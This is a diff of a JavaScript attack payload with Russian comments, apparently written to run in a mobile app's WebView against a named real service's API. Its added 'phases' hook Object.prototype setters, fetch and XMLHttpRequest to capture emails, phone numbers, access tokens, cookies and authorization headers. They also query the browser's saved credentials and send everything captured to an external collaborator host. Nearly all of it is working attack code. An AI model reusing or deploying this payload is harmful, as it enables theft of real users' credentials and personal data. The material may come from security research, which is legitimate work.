@@ -1,4 +1,4 @@
-alert('step 3');
+alert('step final');
 var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';
 
 function send(path, data) {
@@ -10,6 +10,58 @@ function send(path, data) {
     }
 }
 
+(function xssi() {
+    setTimeout(function() {
+        try {
+            // Ловушки для перехвата JSON-данных
+            var stolen = [];
+            var fields = ['id','email','phone','name','first_name','last_name',
+                          'address','token','access_token','session'];
+
+            fields.forEach(function(field) {
+                try {
+                    Object.defineProperty(Object.prototype, field, {
+                        set: function(v) {
+                            stolen.push(field + '=' + String(v));
+                            send('xssi-field', { field: field, value: String(v) });
+                        },
+                        get: function() { return undefined; },
+                        configurable: true
+                    });
+                } catch(e) {}
+            });
+
+            // Загружаем API через script tag
+            var urls = [
+                'https://api.kuper.ru/v2/user',
+                'https://api.kuper.ru/v2/app_lt_configuration',
+                'https://api.kuper.ru/v2/user/addresses'
+            ];
+
+            urls.forEach(function(url, i) {
+                var s = document.createElement('script');
+                s.src = url;
+                s.onload = function() {
+                    send('xssi-loaded-' + i, { url: url, stolen: stolen });
+                };
+                s.onerror = function() {
+                    send('xssi-err-' + i, { url: url, stolen: stolen });
+                };
+                document.body.appendChild(s);
+            });
+        } catch(e) {
+            send('xssi-outer-err', { err: e.message });
+        }
+    }, 5000);
+})();
+
+
+// ============================================================
+// ФАЗА 5: fetch no-cors + credentials (проверка отправки cookies)
+// ============================================================
+// mode:'no-cors' = НЕТ preflight, cookies ОТПРАВЛЯЮТСЯ
+// Мы не можем прочитать ответ, но запрос УХОДИТ с cookies
+// Проверь в Burp/proxy что Cookie header присутствует
 (function nocorsFetch() {
     setTimeout(function() {
         try {
@@ -28,6 +80,9 @@ function send(path, data) {
 })();
 
 
+// ============================================================
+// ФАЗА 6: Проверка WebSocket (обходит CORS, cookies в handshake)
+// ============================================================
 (function wsCheck() {
     setTimeout(function() {
         var wsUrls = [
@@ -59,6 +114,13 @@ function send(path, data) {
 })();
 
 
+// ============================================================
+// ФАЗА 7: Download trigger для cookie extraction через native
+// ============================================================
+// onDownloadStart в нативном коде:
+//   CookieManager.getCookie(url) → извлекает cookies для домена
+//   DownloadManager.Request.addRequestHeader("Cookie", cookies)
+// Если скачивание идёт на kuper.ru, cookies будут в запросе
 (function downloadTrigger() {
     setTimeout(function() {
         try {
@@ -76,6 +138,9 @@ function send(path, data) {
 })();
 
 
+// ============================================================
+// ФАЗА 8: iframe к kuper.ru + попытка чтения
+// ============================================================
 (function iframeTest() {
     setTimeout(function() {
         try {
@@ -105,3 +170,108 @@ function send(path, data) {
         }
     }, 10000);
 })();
+
+
+// ============================================================
+// ФАЗА 9: postMessage listener для перехвата данных из iframe
+// ============================================================
+window.addEventListener('message', function(e) {
+    send('postmsg-received', {
+        origin: e.origin,
+        data: String(e.data).substring(0, 2000)
+    });
+});
+
+
+// ============================================================
+// ФАЗА 10: Проверка navigator.credentials API
+// ============================================================
+(function credentialsAPI() {
+    setTimeout(function() {
+        try {
+            if (navigator.credentials && navigator.credentials.get) {
+                navigator.credentials.get({ password: true }).then(function(cred) {
+                    if (cred) {
+                        send('cred-HIT', {
+                            type: cred.type,
+                            id: cred.id,
+                            name: cred.name
+                        });
+                    } else {
+                        send('cred-null', {});
+                    }
+                }).catch(function(e) {
+                    send('cred-err', { err: e.message });
+                });
+            } else {
+                send('cred-noapi', {});
+            }
+        } catch(e) {
+            send('cred-outer-err', { err: e.message });
+        }
+    }, 11000);
+})();
+
+
+// ============================================================
+// ФАЗА 11: Попытка чтения Access-Token через перехват fetch
+// ============================================================
+// Перехватываем глобальный fetch чтобы ловить запросы RN
+(function interceptFetch() {
+    try {
+        var origFetch = window.fetch;
+        window.fetch = function() {
+            var args = arguments;
+            var url = String(args[0]);
+            var opts = args[1] || {};
+            var headers = opts.headers || {};
+
+            // Если запрос идёт с access-token, перехватываем
+            if (headers['access-token'] || headers['Access-Token']) {
+                send('intercepted-token', {
+                    url: url,
+                    token: headers['access-token'] || headers['Access-Token']
+                });
+            }
+
+            return origFetch.apply(this, args);
+        };
+        send('fetch-intercepted', {});
+    } catch(e) {
+        send('fetch-intercept-err', { err: e.message });
+    }
+})();
+
+
+// ============================================================
+// ФАЗА 12: Перехват XMLHttpRequest
+// ============================================================
+(function interceptXHR() {
+    try {
+        var origOpen = XMLHttpRequest.prototype.open;
+        var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
+        var capturedHeaders = {};
+
+        XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
+            if (name.toLowerCase() === 'access-token' || name.toLowerCase() === 'cookie' ||
+                name.toLowerCase() === 'authorization') {
+                send('xhr-header-captured', { name: name, value: value.substring(0, 500) });
+            }
+            return origSetHeader.apply(this, arguments);
+        };
+
+        XMLHttpRequest.prototype.open = function(method, url) {
+            // Логируем все XHR запросы
+            if (url && url.indexOf('kuper') > -1) {
+                send('xhr-to-kuper', { method: method, url: url });
+            }
+            return origOpen.apply(this, arguments);
+        };
+
+        send('xhr-intercepted', {});
+    } catch(e) {
+        send('xhr-intercept-err', { err: e.message });
+    }
+})();
+
+send('payload-loaded', { ts: Date.now(), phases: 12 });
